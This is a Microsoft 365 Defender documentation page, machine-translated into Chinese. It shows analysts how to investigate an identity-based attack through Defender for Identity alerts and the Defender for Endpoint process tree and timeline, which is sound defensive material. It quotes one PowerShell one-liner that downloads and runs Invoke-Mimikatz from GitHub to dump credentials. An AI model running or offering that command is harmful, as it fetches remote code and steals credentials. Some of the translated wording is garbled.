---
title: 以身分識別的攻擊範例
description: 逐步分析身分識別攻擊的範例。
keywords: 事件、警示、調查、關聯性、攻擊、電腦、裝置、使用者、identity、身分識別、信箱、電子郵件、365、microsoft、m365、事件回應、網路攻擊
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: c028289a58247075c33e85d6d6f3797b3ddad7b4
ms.sourcegitcommit: de5fce90de22ba588e75e1a1d2e87e03b9e25ec7
ms.translationtype: MT
ms.contentlocale: zh-TW
ms.lasthandoff: 05/10/2021
ms.locfileid: "52297185"
---
# <a name="example-of-an-identity-based-attack"></a>以身分識別的攻擊範例

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**適用於：**
- Microsoft 365 Defender

Microsoft Defender for Identity 可協助偵測到危及組織中身分識別的惡意企圖。 由於您的身分識別與 Microsoft 365 的 defender 整合，安全性分析程式可以深入瞭解來自于 defender 進行身分識別的威脅，例如，可疑的 Netlogon 許可權提升嘗試。

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>在 Microsoft Defender 身分識別中分析攻擊

Microsoft 365Defender 可讓分析員根據「事件」頁面之 [**警示**] 索引標籤上的偵測來源來篩選警示。 在下列範例中，會將偵測來源篩選為身分 **識別的 Defender**。 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="篩選用於身分識別之 Defender 的偵測來源的範例":::

選取 **置疑的 overpass-雜湊攻擊** 警示會移至 Microsoft Cloud App Security 中顯示更詳細資訊的頁面。 您可以選擇 **深入瞭解此警示類型** 以閱讀有關 [攻擊的描述](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) 和修正建議，以進一步瞭解警示或攻擊。
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="可疑 overpass-雜湊攻擊警示的範例"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>調查 Microsoft Defender for Endpoint 中的相同攻擊

另外，分析員也可以使用 Defender for Endpoint 來深入瞭解端點上的活動。 選取事件佇列中的事件，然後選取 [ **警示** ] 索引標籤。在這裡，他們也可以識別偵測來源。 標示為 EDR 的偵測來源會代表端點偵測和回應，也就是端點的 Defender。 在此，分析員會選取 EDR 所偵測到的警示。

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Defender for Endpoint 中端點偵測及回應的範例"::: 

警示頁面會顯示各種相關資訊，例如受影響裝置名稱、使用者名稱、自動調查的狀態及警示詳細資料。 警示案例會顯示流程樹狀目錄的視覺表示。 處理樹狀目錄是與警示相關的父項與子流程的階層式表示。

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Defender for Endpoint 中的警示處理樹狀目錄範例"::: 

您可以展開每個流程以查看其他詳細資料。 分析員所看到的詳細資料為惡意腳本的一部分所輸入的實際命令、輸出連線 IP 位址及其他有用資訊。

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Defender for Endpoint 中處理常式詳細資料的範例":::
 
透過選擇 [ **在時程表中查看**]，分析員甚至可以進一步深入判斷是否有損損的確切時間。 

Microsoft Defender for Endpoint 可以偵測許多惡意檔和腳本。 不過，由於輸出連線、PowerShell 和命令列活動有許多合法用途，所以部分活動會被視為良性，直到它建立惡意檔或活動為止。 因此，使用時間表可協助分析員將警示放入與周邊活動的內容，以判斷一般檔案系統和使用者活動所遮住的攻擊原始來源或時間。 

為做到這一點，在警示偵測 (會從紅色) 中開始，然後向下按，以判斷導致惡意活動實際開始的時間。 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="在警示偵測時開始的範例"::: 

請務必瞭解及區別一般活動，例如 Windows 更新連線、Windows 信任的軟體啟用流量、其他與 Microsoft 網站的常見連線、協力廠商網際網路活動、Microsoft Endpoint Configuration Manager 活動，以及其他可疑活動的誤報活動。 若要達到此目的，一種方法是使用時間表篩選器。 有許多篩選可以反白顯示特定的活動，篩選出分析員不想要查看的任何專案。 

在下圖中，分析員已篩選為只查看網路和進程事件。 這可讓分析員查看記事本所建立之事件的網路連線與處理常式，其中的是透過 IP 位址建立連線，我們也會在處理樹狀目錄中看到。 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="記事本如何用來進行惡意的輸出連線的範例"::: 

在此特定事件中，記事本是用來進行惡意的輸出連線。 不過，攻擊者只會使用 iexplorer.exe 建立連線來下載惡意的負載，因為一般 iexplorer.exe 進程會被視為一般網頁瀏覽器活動。

時程表中另一個要尋找的專案會是 PowerShell 輸出連線的使用方式。 分析師會尋找成功的 PowerShell 連線，其方式如下 `IEX (New-Object Net.Webclient)` ：主控惡意檔之網站的輸出連線。 

在下列範例中，PowerShell 是用來從網站下載並執行 Mimikatz：

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
分析員可以在搜尋列中輸入關鍵字，以快速搜尋關鍵字，只顯示使用 PowerShell 所建立的事件。 

## <a name="next-step"></a>下一步

請參閱 [網路釣魚](first-incident-path-phishing.md) 調查路徑。

## <a name="see-also"></a>請參閱

- [事件概觀](incidents-overview.md)
- [管理事件](manage-incidents.md)
- [調查事件](investigate-incidents.md)
